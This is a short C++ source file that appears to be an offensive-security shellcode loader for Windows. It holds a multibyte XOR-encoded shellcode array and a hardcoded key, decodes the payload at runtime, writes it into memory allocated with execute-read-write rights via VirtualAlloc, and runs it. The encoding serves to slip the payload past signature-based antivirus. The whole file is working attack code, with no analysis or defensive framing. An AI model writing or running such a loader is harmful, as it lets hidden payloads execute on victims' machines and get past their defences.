// mutlibyteEncodedShellcode.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <iostream>

int main(int argc, char **argv) {

	// Multibyte XOR encoded shellcode obtained from output of shellcode_xor_encoder.py
	char b[] = "\x91\x91\xe0\x65\x6c\x6f\x16\xec\x81\x5a\xa5\x1d\xe6\x29\x52\xee\x3e\x63\xfd\x37\x70\xe0\x17\x51\x62\xce\x28\x43\x5d\x90\xda\x59\x5\x17\x67\x55\x4d\xb8\xad\x68\x6d\xa8\x94\x97\x36\x3c\xee\x2b\x7d\xf2\x28\x59\xe7\x23\x67\x1d\x87\x23\x64\xa8\x3c\xf2\x3b\x45\x6d\xbc\xfd\x2c\x7c\x88\x5f\x30\xe6\x4d\xe9\x64\xba\x5e\x89\xc9\xa5\xa4\x68\x78\xaa\x41\x82\x10\x9a\x6c\xb\x9d\x5f\x16\x41\xc\x89\x21\xe9\x3d\x48\x6e\xa5\x3\xef\x67\x2e\xf2\x35\x65\x63\xb6\xe7\x6b\xfd\x64\xb4\xe2\x21\x5d\x49\x22\x39\x4\x35\x35\x27\x9a\x84\x34\x3a\x23\xe6\x6b\x89\xe8\x31\x7\x45\x57\x64\x6b\xd\xe\x1e\x4b\x3d\x31\x4\x23\x1\x43\x63\x94\xb0\xc1\xfd\x78\x62\x65\x45\xab\x22\x35\xc\x42\xe5\x12\x6d\x86\xb7\xf\x69\x7\xb6\xcd\x50\xe9\xd\x7b\x6d\x68\x3e\xec\x8a\x3f\x26\x35\x34\x2b\x35\x39\x3d\x11\x88\x6a\xb3\x8f\x89\xb0\xf3\x1\x75\x2f\x3a\x11\xfb\xc0\x18\xe\x89\xb0\xe1\xab\x11\x73\x92\x37\x6a\x10\x80\x87\x17\x65\x64\x6b\xf\x79\x7\x7d\x34\x32\x4\x6d\xaf\xad\x3b\x94\xb0\xfa\x95\x79\x1c\x53\xe7\x59\x1c\x25\xc\x6b\x75\x79\x6d\x2f\x8\x65\x4\x37\xd2\x36\x81\x94\xb0\xea\x3e\x13\x62\x33\x3f\x38\x1e\x67\xbd\xa3\x3a\x86\xb8\xfa\x9a\x65\x11\x4d\x2e\xd\x64\x2b\x65\x79\x7\x79\x32\xd\x67\x40\x79\x55\x9b\xbe\x32\x11\x18\x17\x2f\x4\x93\xba\x28\x3b\x9b\x67\x41\x90\x1c\x86\x9d\x9a\x6d\xac\x5f\xa3\x11\xac\xa6\xc2\x9d\xcc\xc0\x33\x6\x6f\x25\x9a\xb1";

	// Char array to host the deciphered shellcode
	char c[sizeof b];

	// BEWARE, the key must be the same as the one used in shellcode_xor_encoder.py
	char key[] = "mybelovedkey";

	// XOR decoding stub using the key defined above must be the same as the encoding key
	int j = 0;
	for (int i = 0; i < sizeof b; i++) {
		if (j == sizeof key - 1) j = 0;

		c[i] = b[i] ^ key[j];
		j++;
	}

	// Allocating memory with EXECUTE writes
	void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copying deciphered shellcode into memory as a function
	memcpy(exec, c, sizeof c);

	// Call the shellcode
	((void(*)())exec)();
}